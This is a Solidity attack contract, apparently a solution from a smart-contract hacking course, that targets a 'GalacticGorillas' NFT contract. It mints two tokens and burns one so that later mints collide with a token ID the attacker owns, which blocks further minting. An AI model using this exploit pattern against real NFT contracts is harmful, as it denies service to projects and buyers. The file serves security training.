// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {GalacticGorillas} from "./GalacticGorillas.sol";

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract AttackGalacticGorillas {
    GalacticGorillas immutable galacticGorillas;
    address owner;

    constructor(address _galacticGorillas) {
        owner = msg.sender;
        galacticGorillas = GalacticGorillas(_galacticGorillas);
    }

    function attack() external payable {
        uint16 currentSupply = galacticGorillas.totalSupply();

        // we are minting token 4 and 5
        // and burn 4th token
        // when someone tries to mint a token => tokenId becomes 5 and it belongs to us so no one can mint again

        galacticGorillas.mint{value: msg.value}(2);
        galacticGorillas.burn(currentSupply + 1);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        public
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
